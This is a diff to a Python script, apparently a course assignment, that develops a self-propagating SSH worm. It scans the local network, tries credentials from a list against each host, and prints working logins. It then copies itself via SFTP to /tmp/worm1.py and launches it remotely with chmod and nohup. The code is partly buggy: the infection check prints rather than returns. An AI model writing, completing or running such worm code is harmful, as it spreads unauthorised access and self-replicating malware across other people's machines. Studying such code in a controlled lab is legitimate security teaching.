@@ -33,7 +33,11 @@ def isInfectedSystem():
 	# as infected).
 	
 	# checks if infected.txt already exists
-	os.path.isfile(INFECTED_MARKER_FILE)
+
+	if os.path.isfile(INFECTED_MARKER_FILE) == True:
+		print ("true")
+	else:
+		print ("false")
 		
 	
 #################################################################
@@ -194,6 +198,8 @@ def getHostsOnTheSameNetwork():
 	
 	
 	return runningHosts
+
+
 def attackSystem(host):
 	
 	# The credential list
@@ -219,39 +225,58 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		#print("Trying Username & password combination: " +username +" "+ password)
+		print("Trying Username & password combination: " +username +" "+ password)
 		if tryCredentials(host, username, password, ssh) == 0: 
-			print ("We have successfully compromised the victim")
-			#attemptResults = (ssh.connect(host,username=username, password=password), username, password)
+			print ("We have successfully compromised the victim: " + host +" with: "+ username + " " + password)
+			attemptResults = (ssh.connect(host,username=username, password=password), username, password)
 			# create an instance of the SFTP client used for uploading/dl files and exe. commands
 			sftp = ssh.open_sftp()
-			# create infected file 
-			markInfected()	
-			# Copy yourself toe the remote system. 
-			sftp.put("/tmp/infected.txt", "/tmp/infected.txt")
-			#	# Copy the file from the specified
-			#	# remote path to the specified
-			# 	# local path. If the file does exist
-			#	# at the remote path, then get()
-			# 	# will throw IOError exception
-			# 	# (that is, we know the system is
-			# 	# not yet infected).
-			sftp.get('/tmp/infected.txt', '/tmp/infected.txt')
-		#except IOError:
-		 #      print ("This system should be infected")
-		#
-		#
-		# If the system was already infected proceed.
-		# Otherwise, infect the system and terminate.
-		# Infect that system			
-			
-	# Could not find working credentials
-	paramiko.SSHException()
-	
-	print("Could not find working credentials")
-	#return None	
 
-#print(getHostsOnTheSameNetwork())
+			# If the system was already infected proceed.
+			# Otherwise, infect the system and terminate.
+			# Infect that system	
+			if isInfectedSystem() == True:
+				return 
+			# Did the attack succeed?
+			if attemptResults:
+				# create infected file 
+				markInfected()	
+				print ("This system should be infected")
+				
+				# Copy yourself to the remote system. 
+				sftp.put("worm1.py", "/tmp/worm1.py")
+
+				#	# Copy the file from the specified
+				#	# remote path to the specified
+				# 	# local path. If the file does exist
+				#	# at the remote path, then get()
+				# 	# will throw IOError exception
+				# 	# (that is, we know the system is
+				# 	# not yet infected).
+				
+			ssh.exec_command("chmod a+x /tmp/worm1.py")
+
+			# /tmp/infected.txt - the malicious file
+
+			# run the whole commnand in the background	
+			ssh.exec_command("nohup python /tmp/worm1.py &")
+
+			return attemptResults
+		else: 
+			# Could not find working credentials
+			paramiko.SSHException()
+	
+			#print("These Credentials didn't work: " + username +" "+ password + " on: " + host)
+
+
+		
+		#except IOError:
+		 #      
+		#
+		#
+		
+	
+	
 
 
 # If we are being run without a command line parameters, 
@@ -285,29 +310,11 @@ print ("Found hosts: ", networkHosts ,'\n')
 
 
 # Go through the network hosts
-for host in networkHosts:
-	
-	print("Connecting to: " + host)	
+for host in networkHosts:	
 
 	# Try to attack this host
-	print("Trying to attack: " + host)
+	print("Trying to Connect to: " + host)
 	sshInfo =  attackSystem(host)	
 
-	#print (sshInfo)	
-	
-	# Did the attack succeed?
 	if sshInfo:
-		
-		print ("Trying to spread")
-		
-		# TODO: Check if the system was	
-		# already infected. This can be
-		# done by checking whether the
-		# remote system contains /tmp/infected.txt
-		# file (which the worm will place there
-		# when it first infects the system)
-		# This can be done using code similar to
-		# the code below:
-		#try:
-		remotepath = '/tmp/infected.txt'
-		localpath = '/home/cpsc/'
+		break	
